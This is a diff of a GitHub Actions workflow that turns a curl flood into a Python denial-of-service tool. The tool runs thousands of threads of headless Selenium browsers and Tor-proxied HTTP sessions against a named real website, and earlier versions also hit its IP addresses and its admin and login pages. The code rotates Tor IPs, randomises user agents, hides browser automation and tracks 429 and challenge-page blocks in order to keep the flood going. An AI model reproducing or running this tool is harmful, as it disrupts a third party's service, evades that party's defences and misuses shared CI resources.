@@ -1,106 +1,340 @@
-name: 💀 ULTRA DOS - 100K REQUESTS/MIN
+name: 💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR
 
 on:
   workflow_dispatch:
     inputs:
       duration:
-        description: 'المدة بالدقائق'
+        description: 'المدة بالدقائق (0 = لا نهائي)'
         required: true
-        default: '6500'
+        default: '300'
+      threads:
+        description: 'عدد الخيوط (max 5000)'
+        required: true
+        default: '5000'
 
 jobs:
-  dos:
+  mega_attack:
     runs-on: ubuntu-latest
-    timeout-minutes: 6500
+    timeout-minutes: 999999
     
     steps:
-      - name: Install curl
-        run: sudo apt update && sudo apt install -y curl
-        
-      - name: 🔥 ULTRA ATTACK - 100K/MIN
+      - name: Install dependencies
         run: |
-          echo "╔══════════════════════════════════════════════════════════════╗"
-          echo "║     💀 ULTRA DOS - 100,000 REQUESTS PER MINUTE 💀            ║"
-          echo "╚══════════════════════════════════════════════════════════════╝"
-          echo ""
-          echo "🎯 Target: flixtn.com"
-          echo "⏱️  Duration: ${{ github.event.inputs.duration }} minutes"
-          echo "⚡ Rate: 100,000 requests/minute"
-          echo ""
+          sudo apt update
+          sudo apt install -y tor chromium-browser python3-pip
+          pip3 install selenium requests[socks] stem fake_useragent
           
-          END=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
-          TOTAL=0
-          SUCCESS=0
-          FAILED=0
+      - name: 🔥 MEGA DOS - 5000 THREADS
+        run: |
+          cat > mega_attack.py << 'EOF'
+          import time
+          import random
+          import requests
+          import subprocess
+          import threading
+          import sys
+          from selenium import webdriver
+          from selenium.webdriver.chrome.options import Options
+          from selenium.common.exceptions import TimeoutException, WebDriverException
+          from fake_useragent import UserAgent
           
-          # الأهداف
-          TARGETS=(
-            "https://flixtn.com/"
-            "https://flixtn.com/api"
-            "https://flixtn.com/admin"
-            "https://flixtn.com/login"
-            "https://flixtn.com/dashboard"
-            "https://flixtn.com/admin-auth"
-            "https://64.29.17.65/"
-            "https://216.198.79.65/"
-          )
+          # ============================================
+          # إعدادات الهجوم
+          # ============================================
+          TARGET = "https://flixtn.com"
+          DURATION_MINUTES = ${{ github.event.inputs.duration }}
+          THREADS = ${{ github.event.inputs.threads }}
           
-          echo "🔥 ATTACK STARTED - PRINTING EVERY REQUEST 🔥"
-          echo ""
+          # إحصائيات
+          stats = {
+              "total": 0,
+              "success": 0,
+              "failed": 0,
+              "blocked": 0,
+              "timeout": 0,
+              "ip_changes": 0,
+              "requests_per_second": 0
+          }
+          stats_lock = threading.Lock()
+          running = True
+          start_time = time.time()
           
-          while [ $SECONDS -lt $END ]; do
-            MINUTE_START=$SECONDS
-            MINUTE_COUNT=0
-            
-            # 100,000 طلب في الدقيقة = ~1667 طلب في الثانية
-            for second in {1..60}; do
-              SECOND_START=$SECONDS
+          # ============================================
+          # إعداد Tor
+          # ============================================
+          def start_tor():
+              try:
+                  subprocess.run(["sudo", "systemctl", "start", "tor"], check=False, timeout=10)
+                  time.sleep(5)
+                  print("✅ Tor service started")
+              except Exception as e:
+                  print(f"⚠️ Tor start warning: {e}")
+          
+          def renew_tor_ip():
+              try:
+                  subprocess.run(["sudo", "systemctl", "reload", "tor"], check=False, timeout=5)
+                  time.sleep(2)
+                  with stats_lock:
+                      stats["ip_changes"] += 1
+                  print(f"\n🔄 Tor IP renewed ({stats['ip_changes']} changes)")
+              except Exception as e:
+                  pass
+          
+          def get_tor_session():
+              session = requests.Session()
+              session.proxies = {
+                  'http': 'socks5h://127.0.0.1:9050',
+                  'https': 'socks5h://127.0.0.1:9050'
+              }
+              session.timeout = 10
+              return session
+          
+          # ============================================
+          # هجوم Selenium عبر Tor
+          # ============================================
+          def selenium_attack(worker_id):
+              global stats, running
               
-              # 1667 طلب في هذه الثانية
-              for i in {1..1667}; do
-                for target in "${TARGETS[@]}"; do
-                  # تنفيذ الطلب وطباعة النتيجة فورًا
-                  (
-                    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$target" \
-                      -H "Range: bytes=0-500000" \
-                      -H "User-Agent: Mozilla/5.0" \
-                      --max-time 1 \
-                      2>/dev/null)
-                    echo "[$(date +%H:%M:%S)] 🔥 $target → $STATUS"
-                  ) &
-                  
-                  MINUTE_COUNT=$((MINUTE_COUNT + 1))
-                  TOTAL=$((TOTAL + 1))
-                  
-                  if [[ "$STATUS" == "200" ]]; then
-                    SUCCESS=$((SUCCESS + 1))
-                  else
-                    FAILED=$((FAILED + 1))
-                  fi
-                done
-              done
+              chrome_options = Options()
+              chrome_options.add_argument('--headless')
+              chrome_options.add_argument('--no-sandbox')
+              chrome_options.add_argument('--disable-dev-shm-usage')
+              chrome_options.add_argument('--disable-gpu')
+              chrome_options.add_argument('--window-size=1920,1080')
+              chrome_options.add_argument('--proxy-server=socks5://127.0.0.1:9050')
+              chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+              chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+              chrome_options.add_experimental_option('useAutomationExtension', False)
               
-              # انتظر حتى تكتمل الثانية
-              sleep 0.5
-            done
-            
-            # إحصاءات نهاية الدقيقة
-            echo ""
-            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-            echo "📊 MINUTE $(( (SECONDS - $MINUTE_START) / 60 )) COMPLETE"
-            echo "   Requests this minute: $MINUTE_COUNT"
-            echo "   Total requests: $TOTAL"
-            echo "   Success: $SUCCESS | Failed: $FAILED"
-            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-            echo ""
-          done
+              ua = UserAgent()
+              chrome_options.add_argument(f'user-agent={ua.random}')
+              
+              while running:
+                  driver = None
+                  try:
+                      driver = webdriver.Chrome(options=chrome_options)
+                      driver.set_page_load_timeout(12)
+                      driver.get(TARGET)
+                      
+                      time.sleep(random.uniform(0.5, 1.5))
+                      title = driver.title
+                      current_url = driver.current_url
+                      
+                      with stats_lock:
+                          stats["total"] += 1
+                          if "Security" in title or "Challenge" in title:
+                              stats["blocked"] += 1
+                              print(f"🚫 [{worker_id}] Challenge page: {title[:40]}")
+                          elif "Error" in title or "502" in title or "503" in title:
+                              stats["failed"] += 1
+                              print(f"⚠️ [{worker_id}] Error: {title[:40]}")
+                          else:
+                              stats["success"] += 1
+                              print(f"✅ [{worker_id}] {current_url[:50]} → {title[:30]}")
+                      
+                      driver.quit()
+                      
+                  except TimeoutException:
+                      with stats_lock:
+                          stats["total"] += 1
+                          stats["timeout"] += 1
+                      print(f"⏰ [{worker_id}] Timeout")
+                      if driver:
+                          driver.quit()
+                          
+                  except WebDriverException as e:
+                      with stats_lock:
+                          stats["total"] += 1
+                          stats["failed"] += 1
+                      if "ERR_CONNECTION_REFUSED" in str(e):
+                          print(f"🔴 [{worker_id}] Connection refused")
+                      else:
+                          print(f"❌ [{worker_id}] Driver error")
+                      if driver:
+                          driver.quit()
+                          
+                  except Exception as e:
+                      with stats_lock:
+                          stats["total"] += 1
+                          stats["failed"] += 1
+                      if driver:
+                          driver.quit()
+                  
+                  time.sleep(random.uniform(0.3, 0.8))
           
-          echo ""
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "📊 FINAL STATISTICS:"
-          echo "   Total requests: $TOTAL"
-          echo "   Successful: $SUCCESS"
-          echo "   Failed: $FAILED"
-          echo "   Duration: ${{ github.event.inputs.duration }} minutes"
-          echo "   Average rate: $((TOTAL / ${{ github.event.inputs.duration }})) req/min"
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          # ============================================
+          # هجوم curl عبر Tor (أسرع)
+          # ============================================
+          def curl_attack(worker_id):
+              global stats, running
+              session = None
+              
+              while running:
+                  try:
+                      if session is None:
+                          session = get_tor_session()
+                      
+                      headers = {
+                          'User-Agent': UserAgent().random,
+                          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                          'Accept-Language': 'ar,en;q=0.9',
+                          'Cache-Control': 'no-cache',
+                          'Pragma': 'no-cache'
+                      }
+                      
+                      response = session.get(TARGET, timeout=8, headers=headers)
+                      
+                      with stats_lock:
+                          stats["total"] += 1
+                          if response.status_code == 200:
+                              stats["success"] += 1
+                              print(f"⚡ [{worker_id}] 200 OK")
+                          elif response.status_code == 429:
+                              stats["blocked"] += 1
+                              print(f"🚫 [{worker_id}] 429 Rate Limited")
+                          elif response.status_code in [502, 503, 504]:
+                              stats["failed"] += 1
+                              print(f"⚠️ [{worker_id}] {response.status_code} Server Error")
+                          else:
+                              stats["failed"] += 1
+                              print(f"❌ [{worker_id}] {response.status_code}")
+                      
+                  except requests.exceptions.Timeout:
+                      with stats_lock:
+                          stats["total"] += 1
+                          stats["timeout"] += 1
+                      print(f"⏰ [{worker_id}] Timeout")
+                      
+                  except requests.exceptions.ConnectionError:
+                      with stats_lock:
+                          stats["total"] += 1
+                          stats["failed"] += 1
+                      print(f"🔴 [{worker_id}] Connection refused")
+                      session = None
+                      
+                  except Exception:
+                      with stats_lock:
+                          stats["total"] += 1
+                          stats["failed"] += 1
+                      session = None
+                  
+                  time.sleep(random.uniform(0.1, 0.3))
+          
+          # ============================================
+          # تشغيل الخيوط
+          # ============================================
+          def stats_printer():
+              global stats, running, start_time
+              last_total = 0
+              last_second = time.time()
+              
+              while running:
+                  time.sleep(1)
+                  current_time = time.time()
+                  elapsed = current_time - start_time
+                  
+                  with stats_lock:
+                      total = stats["total"]
+                      success = stats["success"]
+                      failed = stats["failed"]
+                      blocked = stats["blocked"]
+                      timeout = stats["timeout"]
+                      ip_changes = stats["ip_changes"]
+                      rps = total - last_total
+                      last_total = total
+                  
+                  # حساب الوقت المتبقي
+                  if DURATION_MINUTES > 0:
+                      remaining = max(0, (DURATION_MINUTES * 60) - elapsed)
+                      remaining_min = int(remaining // 60)
+                      remaining_sec = int(remaining % 60)
+                      time_str = f"⏱️ Remaining: {remaining_min}m {remaining_sec}s"
+                  else:
+                      time_str = "♾️ Infinite mode"
+                  
+                  elapsed_min = int(elapsed // 60)
+                  elapsed_sec = int(elapsed % 60)
+                  
+                  # طباعة الإحصائيات
+                  print(f"\n{'='*70}")
+                  print(f"📊 [{elapsed_min:02d}:{elapsed_sec:02d}] {time_str}")
+                  print(f"   🔥 Total: {total:>8,} | ✅ Success: {success:>8,} | ❌ Failed: {failed:>8,}")
+                  print(f"   🚫 Blocked: {blocked:>8,} | ⏰ Timeout: {timeout:>8,} | 🔄 IP Changes: {ip_changes:>5}")
+                  print(f"   ⚡ RPS: {rps:>5}/s | 🧵 Threads: {THREADS}")
+                  print(f"{'='*70}")
+                  
+                  # تحقق من انتهاء الوقت
+                  if DURATION_MINUTES > 0 and elapsed >= DURATION_MINUTES * 60:
+                      global running
+                      running = False
+                      print("\n⏰ Time limit reached. Stopping...")
+                      break
+          
+          # ============================================
+          # الوظيفة الرئيسية
+          # ============================================
+          print("╔════════════════════════════════════════════════════════════════════╗")
+          print("║     💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR + REAL-TIME 💀    ║")
+          print("╚════════════════════════════════════════════════════════════════════╝")
+          print("")
+          print(f"🎯 Target: {TARGET}")
+          print(f"⏱️  Duration: {DURATION_MINUTES} minutes" if DURATION_MINUTES > 0 else "⏱️  Duration: INFINITE")
+          print(f"🧵 Threads: {THREADS}")
+          print(f"⚡ Power: SELENIUM (browser) + TOR (IP rotation) + CURL (fast)")
+          print("")
+          
+          # تشغيل Tor
+          start_tor()
+          
+          # تجديد IP كل 3 دقائق
+          last_renew = time.time()
+          
+          # تشغيل الخيوط (نصفها Selenium، نصفها Curl)
+          threads = []
+          for i in range(THREADS):
+              if i % 2 == 0:
+                  t = threading.Thread(target=selenium_attack, args=(i+1,))
+              else:
+                  t = threading.Thread(target=curl_attack, args=(i+1,))
+              t.daemon = True
+              t.start()
+              threads.append(t)
+          
+          print(f"🔥 {THREADS} threads launched!")
+          print("")
+          
+          # تشغيل عداد الإحصائيات
+          printer_thread = threading.Thread(target=stats_printer)
+          printer_thread.daemon = True
+          printer_thread.start()
+          
+          # حلقة تجديد IP
+          while running:
+              time.sleep(60)
+              if time.time() - last_renew > 180:  # كل 3 دقائق
+                  renew_tor_ip()
+                  last_renew = time.time()
+          
+          # انتظار انتهاء الخيوط
+          print("\n🛑 Waiting for threads to finish...")
+          for t in threads:
+              t.join(timeout=2)
+          
+          # الإحصائيات النهائية
+          elapsed = time.time() - start_time
+          print("\n" + "="*70)
+          print("📊 FINAL STATISTICS:")
+          print(f"   Total time: {int(elapsed // 60)}m {int(elapsed % 60)}s")
+          print(f"   Total requests: {stats['total']:,}")
+          print(f"   Successful: {stats['success']:,}")
+          print(f"   Failed: {stats['failed']:,}")
+          print(f"   Blocked (429/Challenge): {stats['blocked']:,}")
+          print(f"   Timeouts: {stats['timeout']:,}")
+          print(f"   Tor IP changes: {stats['ip_changes']}")
+          if stats['total'] > 0:
+              print(f"   Success rate: {stats['success']/stats['total']*100:.1f}%")
+              print(f"   Average RPS: {stats['total']/elapsed:.1f}")
+          print("="*70)
+          EOF
+          
+          python3 mega_attack.py
